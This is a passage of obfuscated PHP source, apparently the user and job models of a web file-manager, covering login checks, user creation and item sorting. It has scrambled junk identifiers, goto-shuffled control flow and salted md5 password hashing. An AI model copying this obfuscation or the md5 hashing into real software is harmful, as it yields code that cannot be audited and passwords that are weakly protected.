$eﬁîô©Ωáﬂ[$bñ£˘éÉ¯∏]; $this->where($dı∞‡Ç—‹í)->save(array($eüÃç¢≈äµ[2065] => $bñ£˘éÉ¯∏ + 1)); } return !0; } protected function moveTop($cùÚóäı…è) { goto BÛ§¡ïıßò; aŸßä§Õ•Ó: return $this->resetSort($C⁄ŸÜ‘àü°); goto cÇããúÙ≤…; A≤Ûê‚∆¥ì: $Aîåã›⁄«Ω = $C⁄ŸÜ‘àü°; $C⁄ŸÜ‘àü° = array_remove_value($C⁄ŸÜ‘àü°, $fé‡¯ÈÇ›È[$dè™˜Ÿ“∑ˆ[372]]); array_unshift($C⁄ŸÜ‘àü°, $fé‡¯ÈÇ›È[$dè™˜Ÿ“∑ˆ[372]]); goto aŸßä§Õ•Ó; Fß∆ıº‰®≥: if (!$fé‡¯ÈÇ›È) { return; } $C⁄ŸÜ‘àü° = $this->field($dè™˜Ÿ“∑ˆ[372])->where($b€ë¨ÍÍò‚)->order($dè™˜Ÿ“∑ˆ[2435])->select(); $C⁄ŸÜ‘àü° = array_to_keyvalue($C⁄ŸÜ‘àü°, $dè™˜Ÿ“∑ˆ[33], $dè™˜Ÿ“∑ˆ[372]); goto A≤Ûê‚∆¥ì; BÛ§¡ïıßò: $dè™˜Ÿ“∑ˆ =& $_SERVER[Æ¡î¢≠¯™]; $b€ë¨ÍÍò‚ = array($dè™˜Ÿ“∑ˆ[1388] => USER_ID, $dè™˜Ÿ“∑ˆ[440] => 0); $fé‡¯ÈÇ›È = $this->where($b€ë¨ÍÍò‚)->where(array($dè™˜Ÿ“∑ˆ[28] => $cùÚóäı…è))->find(); goto Fß∆ıº‰®≥; cÇããúÙ≤…: } protected function moveBottom($E√‹àèÂ˘“) { $a·Â§ä¶‘€ =& $_SERVER[Æ¡î¢≠¯™]; $Eó„é‰«⁄Ù = array($a·Â§ä¶‘€[1388] => USER_ID, $a·Â§ä¶‘€[440] => 0); $bØî·ñ◊¯ë = $this->where($Eó„é‰«⁄Ù)->max($a·Â§ä¶‘€[2082]); $Fà÷◊á€◊Ò = array($a·Â§ä¶‘€[2082] => $bØî·ñ◊¯ë + 1); return $this->where($Eó„é‰«⁄Ù)->where(array($a·Â§ä¶‘€[28] => $E√‹àèÂ˘“))->save($Fà÷◊á€◊Ò); } private function getAutoName($FÓ≥”œ‹û€) { goto D◊Èæ—Ω§ë; A—∞ï†™ﬁ˜: $AÆâÕØπÊÌ = array_to_keyvalue($AÆâÕØπÊÌ, $Bªö∆™Ùíÿ[33], $Bªö∆™Ùíÿ[28]); if (!$AÆâÕØπÊÌ || !in_array($FÓ≥”œ‹û€, $AÆâÕØπÊÌ)) { return $FÓ≥”œ‹û€; } for ($Cë™Ú÷ú¥∫ = 0; $Cë™Ú÷ú¥∫ < count($AÆâÕØπÊÌ); $Cë™Ú÷ú¥∫++) { if (!in_array($FÓ≥”œ‹û€ . "\50{$Cë™Ú÷ú¥∫}\x29", $AÆâÕØπÊÌ)) { return $FÓ≥”œ‹û€ . "\x28{$Cë™Ú÷ú¥∫}\x29"; } } goto Aï˘ú“Ó•; Aï˘ú“Ó•: return $FÓ≥”œ‹û€ . "\x28{$Cë™Ú÷ú¥∫}\51"; goto F«¥“æŒ∂“; D◊Èæ—Ω§ë: $Bªö∆™Ùíÿ =& $_SERVER[Æ¡î¢≠¯™]; $DƒçÖ¨åÌŒ = array($Bªö∆™Ùíÿ[1388] => USER_ID, $Bªö∆™Ùíÿ[440] => 0); $AÆâÕØπÊÌ = $this->field($Bªö∆™Ùíÿ[28])->where($DƒçÖ¨åÌŒ)->select(); goto A—∞ï†™ﬁ˜; F«¥“æŒ∂“: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x6a\157\142\114\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x64\145\x73\x63", "\163\x6f\162\164"); const JOB_KEY = "\x73\x65\x6c\146\x4a\157\x62\114\x69\x73\164"; public function listData($EèÒù’‰Õ« = false, $dõ≈±ÎÛáæ = "\163\x6f\x72\164", $dƒ‘Ï¿¯·» = false) { return parent::listData($EèÒù’‰Õ«, $dõ≈±ÎÛáæ, $dƒ‘Ï¿¯·»); } public function remove($AãÆÚÛç‡¬) { return parent::remove($AãÆÚÛç‡¬); } public function add($b€€ÓπÃ≠Ê) { $CÊïªÎπô« =& $_SERVER[Æ¡î¢≠¯™]; if ($this->findByName($b€€ÓπÃ≠Ê[$CÊïªÎπô«[28]])) { return !1; } $b€€ÓπÃ≠Ê[$CÊïªÎπô«[2082]] = $this->getSort(); return parent::insert($b€€ÓπÃ≠Ê); } private function getSort() { $D’ëüﬂùåŒ =& $_SERVER[Æ¡î¢≠¯™]; $dƒÃÆ∑í±î = parent::listData(); $EöËÆ‡àåá = array_to_keyvalue($dƒÃÆ∑í±î, $D’ëüﬂùåŒ[33], $D’ëüﬂùåŒ[2082]); return empty($EöËÆ‡àåá) ? 0 : max($EöËÆ‡àåá) + 1; } public function update($e∂Î‹®£À¥, $F÷üéîø∏∑) { $Bè—ÇØä®È =& $_SERVER[Æ¡î¢≠¯™]; $E√©£ßéàá = parent::listData($e∂Î‹®£À¥); $Aø©¿ïå¯¨ = $this->findByName($F÷üéîø∏∑[$Bè—ÇØä®È[28]]); if (!$E√©£ßéàá || $Aø©¿ïå¯¨ && $Aø©¿ïå¯¨[$Bè—ÇØä®È[372]] != $E√©£ßéàá[$Bè—ÇØä®È[372]]) { return !1; } return parent::update($e∂Î‹®£À¥, $F÷üéîø∏∑); } public function setUserJob($dèùç¬“›Ã, $Aà–Úâ‘éÙ) { goto Bç‘»ˆü¢È; d°ÌÉë¨é‚: $e£èÏ±à⁄§ = array_to_keyvalue($eŒ≈πÁ∂Ù÷, $Då∆»£≈úÏ[28]); $fÈè√ŒÖíﬂ = $Då∆»£≈úÏ[66]; foreach ($Aà–Úâ‘éÙ as $DÂ…üò—ßÜ) { if ($e£èÏ±à⁄§[$DÂ…üò—ßÜ]) { $fÈè√ŒÖíﬂ .= $e£èÏ±à⁄§[$DÂ…üò—ßÜ][$Då∆»£≈úÏ[372]] . $Då∆»£≈úÏ[47]; } else { $e€∫ëÆ‹ûª = $this->add($DÂ…üò—ßÜ); $fÈè√ŒÖíﬂ .= $e€∫ëÆ‹ûª . $Då∆»£≈úÏ[47]; } } goto bÜÈùùÃä‹; bÜÈùùÃä‹: $fÈè√ŒÖíﬂ = rtrim($fÈè√ŒÖíﬂ, $Då∆»£≈úÏ[47]); Model($Då∆»£≈úÏ[481])->metaSet($dèùç¬“›Ã, self::JOB_KEY, $fÈè√ŒÖíﬂ); goto A∞‘å ¯›Í; Bç‘»ˆü¢È: $Då∆»£≈úÏ =& $_SERVER[Æ¡î¢≠¯™]; if (!is_array($Aà–Úâ‘éÙ)) { $Aà–Úâ‘éÙ = array($Aà–Úâ‘éÙ); } $eŒ≈πÁ∂Ù÷ = parent::listData(); goto d°ÌÉë¨é‚; A∞‘å ¯›Í: } public function getUserJob($cø˜¡«÷£‹) { $Aóˆô≥œÖ‘ = Model($_SERVER[Æ¡î¢≠¯™][481])->metaGet($cø˜¡«÷£‹); return $this->getUserJobInfo($Aóˆô≥œÖ‘[self::JOB_KEY]); } public function getUserJobInfo($Cµ∂ò≠ããˆ) { goto Aã‹ö“ã‹√; fﬁ¢‡ÖÖ•Ç: $Bπ™ê·ö√± = array_remove_key($Bπ™ê·ö√±, $e™∏àµé≥˜[194]); $fÜ∂°ÓäÊ∏ = array(); foreach ($Cä∆ã≈ŒÇ∞ as $CõÜ◊Ëıê¨) { if (isset($Bπ™ê·ö√±[$CõÜ◊Ëıê¨])) { $fÜ∂°ÓäÊ∏[] = $Bπ™ê·ö√±[$CõÜ◊Ëıê¨]; } } goto EÔŒ’ã’£–; EÔŒ’ã’£–: return $fÜ∂°ÓäÊ∏; goto Bçê¡âŒ„; Aã‹ö“ã‹√: $e™∏àµé≥˜ =& $_SERVER[Æ¡î¢≠¯™]; $Cä∆ã≈ŒÇ∞ = explode($e™∏àµé≥˜[47], $Cµ∂ò≠ããˆ); $Bπ™ê·ö√± = parent::listData(); goto fﬁ¢‡ÖÖ•Ç; Bçê¡âŒ„: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\x65" => "\x75\x73\145\162\137\155\x65\164\x61", "\x6d\x65\164\141\x46\151\145\x6c\x64" => "\x75\x73\x65\x72\x49\104"); protected $simpleField = "\165\x73\x65\162\111\x44\54\156\151\x63\153\x4e\x61\x6d\145\54\x6e\x61\x6d\145\54\141\166\x61\x74\141\162\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Fö€‘ìÛ¢) { $Dí≈ü≥„¨à =& $_SERVER[Æ¡î¢≠¯™]; $fô⁄Çπù˘∫ = $Dí≈ü≥„¨à[2436]; return array($Dí≈ü≥„¨à[2127] => array($Fö€‘ìÛ¢[0], $fô⁄Çπù˘∫), $Dí≈ü≥„¨à[2129] => array($Fö€‘ìÛ¢[0], $fô⁄Çπù˘∫), $Dí≈ü≥„¨à[2437] => array($Fö€‘ìÛ¢[0], $fô⁄Çπù˘∫)); } protected function getInfo($F¥ÜŒé≈ù¶, $e÷ïÌˆ√Û÷ = false) { $dÑç©ºÊ≤∑ = $this->getInfoSimple($F¥ÜŒé≈ù¶); if (!is_array($dÑç©ºÊ≤∑)) { return array(); } if ($e÷ïÌˆ√Û÷) { return $this->_getInfoApply($dÑç©ºÊ≤∑); } return $this->cacheFunctionGet($_SERVER[Æ¡î¢≠¯™][2169], $F¥ÜŒé≈ù¶); } protected function getInfoFull($d¡√Î£ú≥∂, $E§ÈçìÉ∑ë = false) { $c≤ΩÔ¬›ƒ® = $this->getInfoSimple($d¡√Î£ú≥∂); if (!is_array($c≤ΩÔ¬›ƒ®)) { return array(); } if ($E§ÈçìÉ∑ë) { return $this->_getInfoApply($c≤ΩÔ¬›ƒ®, !0); return $this->_getInfoApply($c≤ΩÔ¬›ƒ®, !0); } return $this->cacheFunctionGet($_SERVER[Æ¡î¢≠¯™][2438], $d¡√Î£ú≥∂); } private function _getInfoApply($Bçı∆åà‡ó, $eá‚ëï®‘Î = false) { goto EÑÁìúõÍß; e£Óú˜–ÈŒ: $Bçı∆åà‡ó[$BÖìÛ°Ó™Ω[396]][$BÖìÛ°Ó™Ω[2277]] = isset($bÂ•§…»€¿[$BÖìÛ°Ó™Ω[2278]]) ? $bÂ•§…»€¿[$BÖìÛ°Ó™Ω[2278]] : null; if ($eá‚ëï®‘Î) { $Bçı∆åà‡ó[$BÖìÛ°Ó™Ω[421]] = $this->metaGet($Bçı∆åà‡ó[$BÖìÛ°Ó™Ω[1397]]); } return $Bçı∆åà‡ó; goto cüÔêïëÌÀ; bœãØßÁÔ¨: $Bçı∆åà‡ó = $this->_listDataApplyItem($Bçı∆åà‡ó); $bÂ•§…»€¿ = Model($BÖìÛ°Ó™Ω[1096])->metaGet($Bçı∆åà‡ó[$BÖìÛ°Ó™Ω[396]][$BÖìÛ°Ó™Ω[374]]); $Bçı∆åà‡ó[$BÖìÛ°Ó™Ω[2441]] = $C≈è˘í‰Õ¬; goto e£Óú˜–ÈŒ; EÑÁìúõÍß: $BÖìÛ°Ó™Ω =& $_SERVER[Æ¡î¢≠¯™]; if (!$Bçı∆åà‡ó) { return $Bçı∆åà‡ó; } $C≈è˘í‰Õ¬ = md5($BÖìÛ°Ó™Ω[2439] . $Bçı∆åà‡ó[$BÖìÛ°Ó™Ω[789]] . $BÖìÛ°Ó™Ω[2440] . $Bçı∆åà‡ó[$BÖìÛ°Ó™Ω[28]]); goto bœãØßÁÔ¨; cüÔêïëÌÀ: } protected function getInfoSimple($EÈ„èÖä¡‰, $d›∆Ûı…õ = false) { $AÎæÜ°ƒ¯á =& $_SERVER[Æ¡î¢≠¯™]; if (!$EÈ„èÖä¡‰) { return array(); } if ($d›∆Ûı…õ) { $cøãÕﬂÂ¢í = $this->where(array($AÎæÜ°ƒ¯á[1397] => intval($EÈ„èÖä¡‰)))->find(); if (!is_array($cøãÕﬂÂ¢í)) { return array(); } $cøãÕﬂÂ¢í[$AÎæÜ°ƒ¯á[2442]] = Action($AÎæÜ°ƒ¯á[2443])->parseUrl($cøãÕﬂÂ¢í[$AÎæÜ°ƒ¯á[2442]]); return $cøãÕﬂÂ¢í; } return $this->cacheFunctionGet($AÎæÜ°ƒ¯á[2130], $EÈ„èÖä¡‰); } protected function getInfoSimpleOuter($B∑∫“îÌàˆ) { goto F˘®⁄ãË±∫; EôÙû√”∫®: $Dß‹©üëîÜ = array_field_key($d◊ÊåË†°ª, explode($f≥ºìÁíõë[47], $this->simpleField)); if (!$Dß‹©üëîÜ) { return array($f≥ºìÁíõë[1397] => $f≥ºìÁíõë[1017], $f≥ºìÁíõë[28] => $f≥ºìÁíõë[164] . LNG($f≥ºìÁíõë[2446]) . $f≥ºìÁíõë[480], $f≥ºìÁíõë[2442] => STATIC_PATH . $f≥ºìÁíõë[2447]); } $Dß‹©üëîÜ[$f≥ºìÁíõë[2442]] = Action($f≥ºìÁíõë[2443])->parseUrl($Dß‹©üëîÜ[$f≥ºìÁíõë[2442]]); goto eÌ¡ŒïÇÍí; F˘®⁄ãË±∫: $f≥ºìÁíõë =& $_SERVER[Æ¡î¢≠¯™]; if (!$B∑∫“îÌàˆ || $B∑∫“îÌàˆ == 0) { return array($f≥ºìÁíõë[1397] => $f≥ºìÁíõë[472], $f≥ºìÁíõë[28] => $f≥ºìÁíõë[164] . LNG($f≥ºìÁíõë[2444]) . $f≥ºìÁíõë[480], $f≥ºìÁíõë[2442] => STATIC_PATH . $f≥ºìÁíõë[2445]); } $d◊ÊåË†°ª = $this->cacheFunctionGet($f≥ºìÁíõë[2130], $B∑∫“îÌàˆ); goto EôÙû√”∫®; eÌ¡ŒïÇÍí: return $Dß‹©üëîÜ; goto AéÉ∫é≤∂ö; AéÉ∫é≤∂ö: } protected function groupUser($béëÁ†È¨™) { } public static function errorLang($d∏áåîó≠ÿ) { $f¿»π©‹ÇÊ =& $_SERVER[Æ¡î¢≠¯™]; $CﬁúΩ⁄€ΩÛ = array(self::ERROR_USER_NOT_EXISTS => $f¿»π©‹ÇÊ[2448], self::ERROR_USER_PASSWORD_ERROR => $f¿»π©‹ÇÊ[2449], self::ERROR_USER_EXIST_NAME => $f¿»π©‹ÇÊ[2450], self::ERROR_USER_EXIST_PHONE => $f¿»π©‹ÇÊ[2451], self::ERROR_USER_EXIST_EMAIL => $f¿»π©‹ÇÊ[2452], self::ERROR_USER_LOGIN_LOCK => $f¿»π©‹ÇÊ[2453], self::ERROR_IP_NOT_ALLOW => $f¿»π©‹ÇÊ[2454], self::ERROR_USER_EXIST_NICKNAME => $f¿»π©‹ÇÊ[2455]); return LNG($CﬁúΩ⁄€ΩÛ[$d∏áåîó≠ÿ]); } public function getInfoByMeta($fèçêΩñ©à, $CâêÖﬂ«úø) { $b¨ÁëÙı∂‘ =& $_SERVER[Æ¡î¢≠¯™]; $b∆˜Ë©ô‰ = Model($b¨ÁëÙı∂‘[2456])->where(array($b¨ÁëÙı∂‘[99] => $fèçêΩñ©à, $b¨ÁëÙı∂‘[365] => $CâêÖﬂ«úø))->find(); if ($b∆˜Ë©ô‰) { return $this->getInfo($b∆˜Ë©ô‰[$b¨ÁëÙı∂‘[1397]]); } return !1; } public function userLoginCheck($fäæõÌúÚ◊, $a¯ÛåöØâØ) { goto eÏöﬁ™ΩíÚ; bÌËØØÛÜ†: $this->userEdit($B∏óØ´à´Ù[$C∆¯ÿ¿Ê‡‰[1397]], array($C∆¯ÿ¿Ê‡‰[2458] => time())); $this->clearCache($B∏óØ´à´Ù[$C∆¯ÿ¿Ê‡‰[1397]]); return $this->getInfo($B∏óØ´à´Ù[$C∆¯ÿ¿Ê‡‰[1397]]); goto cÖè¶û«èµ; D€¿ÿ ò◊”: $B∏óØ´à´Ù = $this->where($fÈˆƒ÷‚≤œ)->find(); if (!$B∏óØ´à´Ù) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($B∏óØ´à´Ù[$C∆¯ÿ¿Ê‡‰[1397]], $a¯ÛåöØâØ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto bÌËØØÛÜ†; eÏöﬁ™ΩíÚ: $C∆¯ÿ¿Ê‡‰ =& $_SERVER[Æ¡î¢≠¯™]; $fÈˆƒ÷‚≤œ = array($C∆¯ÿ¿Ê‡‰[28] => $fäæõÌúÚ◊, $C∆¯ÿ¿Ê‡‰[2281] => $fäæõÌúÚ◊, $C∆¯ÿ¿Ê‡‰[299] => $fäæõÌúÚ◊, $C∆¯ÿ¿Ê‡‰[2457] => $fäæõÌúÚ◊, $C∆¯ÿ¿Ê‡‰[902] => $C∆¯ÿ¿Ê‡‰[904]); if ($this->nickNameRpt()) { unset($fÈˆƒ÷‚≤œ[$C∆¯ÿ¿Ê‡‰[2281]]); } goto D€¿ÿ ò◊”; cÖè¶û«èµ: } public function clearCache($aòí¡ﬂ°Ã) { $B†ü¨¡µìº =& $_SERVER[Æ¡î¢≠¯™]; $this->cacheFunctionClear($B†ü¨¡µìº[2169], $aòí¡ﬂ°Ã); $this->cacheFunctionClear($B†ü¨¡µìº[2130], $aòí¡ﬂ°Ã); } public function userPasswordCheck($E±æÃäÕæ◊, $Eêì‰ô’ÏÖ) { $C›©ﬁ¶é”ﬁ =& $_SERVER[Æ¡î¢≠¯™]; $AöÙåè”ß˜ = $this->where(array($C›©ﬁ¶é”ﬁ[1397] => intval($E±æÃäÕæ◊)))->find(); $dÂ√˜è≈õ‚ = $this->metaGet($E±æÃäÕæ◊); $AÜˆ¯µ–ùÖ = isset($dÂ√˜è≈õ‚[$C›©ﬁ¶é”ﬁ[2459]]) ? $dÂ√˜è≈õ‚[$C›©ﬁ¶é”ﬁ[2459]] : $C›©ﬁ¶é”ﬁ[33]; if (md5($AÜˆ¯µ–ùÖ . trim($Eêì‰ô’ÏÖ)) !== $AöÙåè”ß˜[$C›©ﬁ¶é”ﬁ[789]]) { return !1; } return !0; } public function userAdd($c∂ÇÇèå≈Õ) { goto CÒˆ±§áíœ; EåÀèÔÔ Ÿ: $Cﬁ»˘•“å™ = array($Eú≥ åø®Ò[2468] => $bﬁ… Ë¿˘Ñ[$Eú≥ åø®Ò[789]], $Eú≥ åø®Ò[2464] => $bﬁ… Ë¿˘Ñ[$Eú≥ åø®Ò[2281]]); $this->userEdit($f„¶˘æ©¯Æ, $Cﬁ»˘•“å™); Model($Eú≥ åø®Ò[1096])->userRootAdd($f„¶˘æ©¯Æ); goto cçËè©ÇΩë; c€Ÿ‡úöíœ: $F’ÍèØì†∂ = $this->_checkExist($c∂ÇÇèå≈Õ); if ($F’ÍèØì†∂ !== !0) { return $F’ÍèØì†∂; } $f„¶˘æ©¯Æ = $this->add($bﬁ… Ë¿˘Ñ); goto EåÀèÔÔ Ÿ; cçËè©ÇΩë: return $f„¶˘æ©¯Æ; goto c£≥õãÒ„≈; CÒˆ±§áíœ: $Eú≥ åø®Ò =& $_SERVER[Æ¡î¢≠¯™]; $bﬁ… Ë¿˘Ñ = array($Eú≥ åø®Ò[391] => $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[28]], $Eú≥ åø®Ò[2460] => $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2461]], $Eú≥ åø®Ò[2462] => isset($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[299]]) ? $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[299]] : $Eú≥ åø®Ò[33], $Eú≥ åø®Ò[2463] => isset($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2457]]) ? $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2457]] : $Eú≥ åø®Ò[33], $Eú≥ åø®Ò[2464] => isset($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2281]]) ? $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2281]] : $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[28]], $Eú≥ åø®Ò[2465] => isset($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2442]]) ? $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2442]] : $Eú≥ åø®Ò[33], $Eú≥ åø®Ò[2466] => isset($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2467]]) ? $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2467]] : 1, $Eú≥ åø®Ò[2468] => $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[789]], $Eú≥ åø®Ò[2131] => isset($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2045]]) ? $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[2045]] : 1024 * 1024 * 20, $Eú≥ åø®Ò[2132] => 0, $Eú≥ åø®Ò[2458] => 0, $Eú≥ åø®Ò[2156] => isset($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[681]]) ? $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[681]] : 1); if (!empty($c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[1397]])) { $bﬁ… Ë¿˘Ñ[$Eú≥ åø®Ò[1397]] = $c∂ÇÇèå≈Õ[$Eú≥ åø®Ò[1397]]; } goto c€Ÿ‡úöíœ; c£≥õãÒ„≈: } protected function userEditTest($eé≤≈≥∞Ù√, $AêÕé÷Ø£‚) { return $this->call($_SERVER[Æ¡î¢≠¯™][2469], $eé≤≈≥∞Ù√, $AêÕé÷Ø£‚); } protected function userEdit($dâ‹∆‚¯∏ﬂ, $f≤äâ∑≥Ñ◊) { goto cÉÑã—∞õÑ; F◊ØüËáŸ—: $this->where(array($D¯ˆŸ⁄é´‚[1388] => $dâ‹∆‚¯∏ﬂ))->save($f≤äâ∑≥Ñ◊); if (isset($f≤äâ∑≥Ñ◊[$D¯ˆŸ⁄é´‚[2281]])) { $this->setNamePinyin($dâ‹∆‚¯∏ﬂ, $f≤äâ∑≥Ñ◊[$D¯ˆŸ⁄é´‚[2281]]); } return !0; goto AÕêï‰ËÙà; D¯ÉŸ“ºãƒ: $DÀÒ´™ª¥ = $this->_checkExist($f≤äâ∑≥Ñ◊, $dâ‹∆‚¯∏ﬂ); if ($DÀÒ´™ª¥ !== !0) { return $DÀÒ´™ª¥; } if (isset($f≤äâ∑≥Ñ◊[$D¯ˆŸ⁄é´‚[789]]) && trim($f≤äâ∑≥Ñ◊[$D¯ˆŸ⁄é´‚[789]]) != $D¯ˆŸ⁄é´‚[33]) { $DãŸáŸŒ≥ƒ = $this->metaGet($dâ‹∆‚¯∏ﬂ); if (empty($DãŸáŸŒ≥ƒ[$D¯ˆŸ⁄é´‚[2459]])) { $DãŸáŸŒ≥ƒ[$D¯ˆŸ⁄é´‚[2459]] = rand_string(10); Model($D¯ˆŸ⁄é´‚[478])->metaSet($dâ‹∆‚¯∏ﬂ, $D¯ˆŸ⁄é´‚[2459], $DãŸáŸŒ≥ƒ[$D¯ˆŸ⁄é´‚[2459]]); } $f≤äâ∑≥Ñ◊[$D¯ˆŸ⁄é´‚[789]] = md5($DãŸáŸŒ≥ƒ[$D¯ˆŸ⁄é´‚[2459]] . trim($f≤äâ∑≥Ñ◊[$D¯ˆŸ⁄é´‚[789]])); } else { unset($f≤äâ∑≥Ñ◊[$D¯ˆŸ⁄é´‚[789]]); } goto F◊ØüËáŸ—; cÉÑã—∞õÑ: $D¯ˆŸ⁄é´‚ =& $_SERVER[Æ¡î¢≠¯™]; $EÃ∆·¿´¯Í = $this->getInfoSimple($dâ‹∆‚¯∏ﬂ); if (!$EÃ∆·¿´¯Í) { return !1; } goto D¯ÉŸ“ºãƒ; AÕêï‰ËÙà: } public function setNamePinyin($cÁŸïúŸÒÑ, $A«Çç»“¡ß = false) { $b‹’ä”»∏å =& $_SERVER[Æ¡î¢≠¯™]; if (!$A«Çç»“¡ß) { $e§Ñ›¯•≤Ö = $this->getInfoSimple($cÁŸïúŸÒÑ); $A«Çç»“¡ß = $e§Ñ›¯•≤Ö[$b‹’ä”»∏å[2281]] ? $e§Ñ›¯•≤Ö[$b‹’ä”»∏å[2281]] : $e§Ñ›¯•≤Ö[$b‹’ä”»∏å[28]]; } $A…´Õ∆Õ§‡ = Model($b‹’ä”»∏å[481]); if (!Input::check($A«Çç»“¡ß, $b‹’ä”»∏å[532])) { return $A…´Õ∆Õ§‡->metaSet($cÁŸïúŸÒÑ, array($b‹’ä”»∏å[420] => $b‹’ä”»∏å[33], $b‹’ä”»∏å[419] => $b‹’ä”»∏å[33])); } return $A…´Õ∆Õ§‡->metaSet($cÁŸïúŸÒÑ, array($b‹’ä”»∏å[420] => str_replace($b‹’ä”»∏å[50], $b‹’ä”»∏å[33], Pinyin::encode($A«Çç»“¡ß)), $b‹’ä”»∏å[419] => Pinyin::encode($A«Çç»“¡ß, $b‹’ä”»∏å[533]))); } private function nickNameRpt() { $d±≥’Ø¡◊™ =& $_SERVER[Æ¡î¢≠¯™]; $a÷€ƒÒ›èç = Model($d±≥’Ø¡◊™[1074])->get($d±≥’Ø¡◊™[2470]); $FòÒô≈≈õÙ = $GLOBALS[$d±≥’Ø¡◊™[6]][$d±≥’Ø¡◊™[2426]][$d±≥’Ø¡◊™[2470]]; $Bõ»Î∞ÌêÙ = !is_null($a÷€ƒÒ›èç) ? $a÷€ƒÒ›èç : $FòÒô≈≈õÙ; return !!$Bõ»Î∞ÌêÙ; } private function _checkExist($eâ—∆≥ÓÇá, $A∆ÀœÔ¿’≤ = false) { $EÕç¨æôø˘ =& $_SERVER[Æ¡î¢≠¯™]; $f¢Øíã¥À‚ = array($EÕç¨æôø˘[28] => UserModel::ERROR_USER_EXIST_NAME, $EÕç¨æôø˘[2281] => UserModel::ERROR_USER_EXIST_NICKNAME, $EÕç¨æôø˘[299] => UserModel::ERROR_USER_EXIST_EMAIL, $EÕç¨æôø˘[2457] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($f¢Øíã¥À‚[$EÕç¨æôø˘[2281]]); } $aô≠Ø≥¥±∑ = $A∆ÀœÔ¿’≤ ? array($EÕç¨æôø˘[1397] => array($EÕç¨æôø˘[2471], $A∆ÀœÔ¿’≤)) : array(); foreach ($f¢Øíã¥À‚ as $eÜä∏‹öå» => $Bﬂñ’àπãË) { if (!isset($eâ—∆≥ÓÇá[$eÜä∏‹öå»]) || !$eâ—∆≥ÓÇá[$eÜä∏‹öå»]) { continue; } $eü≥ä®ƒÚ = array_merge(array($eÜä∏‹öå» => $eâ—∆≥ÓÇá[$eÜä∏‹öå»]), $aô≠Ø≥¥±∑); $fÂ∏û‰÷à† = $this->where($eü≥ä®ƒÚ)->find(); if ($fÂ∏û‰÷à†) { return $Bﬂñ’àπãË; } } return !0; } public function userListInfo($D±ÆÂé©á≤) { $b…çäì¥¥¯ =& $_SERVER[Æ¡î¢≠¯™]; $Aº©§ó¥ˆä = array(); $D±ÆÂé©á≤ = is_array($D±ÆÂé©á≤) ? array_unique($D±ÆÂé©á≤) : array(); if (!$D±ÆÂé©á≤) { return $Aº©§ó¥ˆä; } if (count($D±ÆÂé©á≤) < 20) { foreach ($D±ÆÂé©á≤ as $D≥õû–—‘≤) { $Aº©§ó¥ˆä[$D≥õû–—‘≤ . $b…çäì¥¥¯[33]] = $this->getInfoSimpleOuter($D≥õû–—‘≤); } } else { $B∆ç¬Ñ§–∑ = array($b…çäì¥¥¯[1388] => array($b…çäì¥¥¯[389], $D±ÆÂé©á≤)); if (count($D±ÆÂé©á≤) == 1) { $B∆ç¬Ñ§–∑ = array($b…çäì¥¥¯[1388] => $D±ÆÂé©á≤[0]); } $a…öÀÌÙ¢Â = Model($b…çäì¥¥¯[478])->field($this->simpleField)->where($B∆ç¬Ñ§–∑)->select(); $a…öÀÌÙ¢Â = array_to_keyvalue($a…öÀÌÙ¢Â, $b…çäì¥¥¯[1397]); foreach ($D±ÆÂé©á≤ as $D≥õû–—‘≤) { $f”öÖÈ⁄ˆó = $a…öÀÌÙ¢Â[$a…öÀÌÙ¢Â[$D≥õû–—‘≤]]; if (!$f”öÖÈ⁄ˆó) { $Aº©§ó¥ˆä[$D≥õû–—‘≤ . $b…çäì¥¥¯[33]] = $this->getInfoSimpleOuter($D≥õû–—‘≤); continue; } $f”öÖÈ⁄ˆó[$b…çäì¥¥¯[2442]] = Action($b…çäì¥¥¯[2443])->parseUrl($f”öÖÈ⁄ˆó[$b…çäì¥¥¯[2442]]); $Aº©§ó¥ˆä[$D≥õû–—‘≤ . $b…çäì¥¥¯[33]] = $f”öÖÈ⁄ˆó; } } return $Aº©§ó¥ˆä; } protected function userStatus($fè¿áÂæÑƒ, $f˘úÀıÓÌ”) { $e€Ù∆Ô∏›› = $this->getInfoSimple($fè¿áÂæÑƒ); if (!$e€Ù∆Ô∏››) { return !1; } $e⁄Ù≥Ú‹ã® = array($_SERVER[Æ¡î¢≠¯™][681] => $f˘úÀıÓÌ”); return $this->userEdit($fè¿áÂæÑƒ, $e⁄Ù≥Ú‹ã®); } protected function userRemove($A°©÷≥≥ªç) { goto BÏ˘”®È∫ì; E€ÚıîÜ¥≈: Model($dÃ≠«≈ê†ÿ[744])->userRootRemove($A°©÷≥≥ªç); return $this->where($CÛÈ≈≠ïóë)->delete(); goto FíÒãéÜ¿Â; f•∑êÓº¢†: 